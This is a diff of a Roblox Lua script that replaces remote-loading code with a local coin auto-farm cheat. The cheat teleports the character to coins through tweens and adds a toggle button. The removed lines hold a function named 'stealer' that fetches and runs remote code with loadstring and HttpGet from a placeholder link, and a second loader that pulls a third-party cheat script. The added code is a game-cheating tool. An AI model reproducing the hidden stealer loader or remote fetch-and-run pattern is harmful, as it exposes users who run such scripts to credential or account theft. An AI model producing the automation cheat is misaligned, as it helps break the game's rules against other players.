@@ -1,11 +1,119 @@
-local function stealer()
+--// Variables
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local LocalPlayer = Players.LocalPlayer
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
 
-loadstring(game:HttpGet("stealerlink"))()
+local farming = false
+local coinsCollected = 0
+local tweenSpeed = 17
+
+--// GUI
+local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+gui.Name = "CoinFarmUI"
+gui.ResetOnSpawn = false
+
+local button = Instance.new("TextButton")
+button.Parent = gui
+button.Size = UDim2.new(0, 160, 0, 50)
+button.Position = UDim2.new(0.5, -80, 0.9, 0)
+button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+button.Text = "АвтоФарм: OFF"
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.TextSize = 20
+button.Font = Enum.Font.SourceSansBold
+
+local corner = Instance.new("UICorner")
+corner.Parent = button
+corner.CornerRadius = UDim.new(0, 10)
+
+--// Coin Finder
+local function findCoinsByColor(r, g, b)
+	local results = {}
+	local function search(obj)
+		for _, child in pairs(obj:GetChildren()) do
+			if child:IsA("BasePart") and child.Name == "Coin_Server" then
+				local color = child.Color
+				local cr, cg, cb = math.floor(color.R * 255), math.floor(color.G * 255), math.floor(color.B * 255)
+				if cr == r and cg == g and cb == b then
+					table.insert(results, child)
+				end
+			end
+			search(child)
+		end
+	end
+	search(workspace)
+	return results
 end
-local function farm()
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/v1ain/Murder-Mystery-2-OP-Script/refs/heads/main/main'))()
+--// Move Function
+local function moveTo(part)
+	if not part or not part:IsDescendantOf(workspace) then return end
+	local distance = (HumanoidRootPart.Position - part.Position).Magnitude
+	local tweenTime = distance / tweenSpeed
+
+	local tween = TweenService:Create(HumanoidRootPart, TweenInfo.new(tweenTime, Enum.EasingStyle.Linear), {CFrame = part.CFrame + Vector3.new(0, 2, 0)})
+	tween:Play()
+	tween.Completed:Wait()
+
+	task.wait(0.5) -- стоим полсекунды на монете
 end
 
-task.spawn(stealer)
-task.spawn(farm)
+--// Nearest Finder
+local function getNearestCoin(coins)
+	local closest
+	local minDist = math.huge
+	for _, coin in ipairs(coins) do
+		local dist = (HumanoidRootPart.Position - coin.Position).Magnitude
+		if dist < minDist then
+			minDist = dist
+			closest = coin
+		end
+	end
+	return closest
+end
+
+--// Farming Loop
+task.spawn(function()
+	while true do
+		task.wait(0.2)
+		if not farming then continue end
+
+		local targetCoins = {}
+
+		if coinsCollected < 20 then
+			targetCoins = findCoinsByColor(163, 162, 165) -- Серые
+		elseif coinsCollected < 40 then
+			targetCoins = findCoinsByColor(245, 205, 48) -- Жёлтые
+		end
+
+		if #targetCoins > 0 then
+			local nextCoin = getNearestCoin(targetCoins)
+			pcall(function()
+				moveTo(nextCoin)
+				coinsCollected += 1
+			end)
+		end
+
+		if coinsCollected >= 40 then
+			LocalPlayer:LoadCharacter()
+			coinsCollected = 0
+			wait(1)
+			Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+			HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+		end
+	end
+end)
+
+--// Toggle Button
+button.MouseButton1Click:Connect(function()
+	farming = not farming
+	if farming then
+		button.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+		button.Text = "autofarm on"
+	else
+		button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+		button.Text = "autofarm off"
+	end
+end)
